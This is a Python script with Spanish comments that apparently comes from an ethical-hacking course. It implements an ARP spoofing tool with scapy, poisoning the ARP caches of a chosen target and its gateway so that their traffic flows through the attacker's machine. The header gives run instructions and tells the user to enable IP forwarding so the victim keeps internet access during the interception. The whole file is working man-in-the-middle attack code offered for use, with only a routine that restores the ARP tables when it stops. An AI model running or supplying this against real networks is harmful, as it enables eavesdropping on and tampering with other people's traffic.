#!/usr/bin/env python
import scapy.all as scapy
import argparse
import time
import sys
#--------------------------------ARP_SPOOF.PY------------------------------------------------
# Funcionamiento : ARP poisoner, el trafico saliendo de la maquina target y del router (gateway)
# pasa ahora por nuestra maquina
# Run : python arp_spoof.py -t <IP target> -g <IP gateway> -i <interface>
# Ejemplo para hacer un MITM: python network_scanner.py -t 10.0.2.7 -g 10.0.2.1 -i eth0
# Al correr, no olvidar averiguar que /proc/sys/net/ipv4/ip_forward tenga el valor 1 para que
# el dispositivo target tenga acceso a internet : echo 1 > /proc/sys/net/ipv4/ip_forward
#---------------------------------------------------------------------------------------------
#https://support.tetcos.com/support/solutions/articles/14000098272-how-to-enable-ip-forwarding-in-windows-to-perform-emulation-using-netsim-

# Recibe los argumentos
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", required=True, dest="gateway", help="Specify spoof ip")
    parser.add_argument("-i", "--iface", required=True, dest="interface", help="Specify interface")
    return parser.parse_args()

# Mismo funcionamiento que network_scanner.py, devuelve el MAC de un ip
def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Cuando se acabe el poisoning, devolvemos los parametros como eran
def restore(A_IP, A_MAC, B_IP, B_MAC, interface):
    packet = scapy.ARP(op=2, pdst=A_IP, hwdst=A_MAC, psrc=B_IP, hwsrc=B_MAC)
    scapy.send(packet, 4, iface=interface)

# Enviamos packetes ARP a target_ip, diciendo que somos spoof_ip
def spoof(A_IP, A_MAC, B_IP, interface):
    packet = scapy.ARP(op=2, pdst=A_IP, hwdst=A_MAC, psrc=B_IP)
    scapy.send(packet, verbose=False, iface=interface)


arguments = get_arguments()
sent_packets = 0
try:
    # Se mandan packetes hasta que lo paremos, hasta no necesitemos mas ser el MITM

    gateway_mac = get_mac(arguments.gateway)
    target_mac = get_mac(arguments.target)

    while True:
        spoof(arguments.target, target_mac, arguments.gateway, arguments.interface)
        spoof(arguments.gateway, gateway_mac, arguments.target, arguments.interface)
        sent_packets+=2
        print("\r[+] Sent packets: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
    restore(arguments.target,target_mac ,arguments.gateway, gateway_mac, arguments.interface)
    restore(arguments.gateway, gateway_mac, arguments.target,target_mac, arguments.interface)
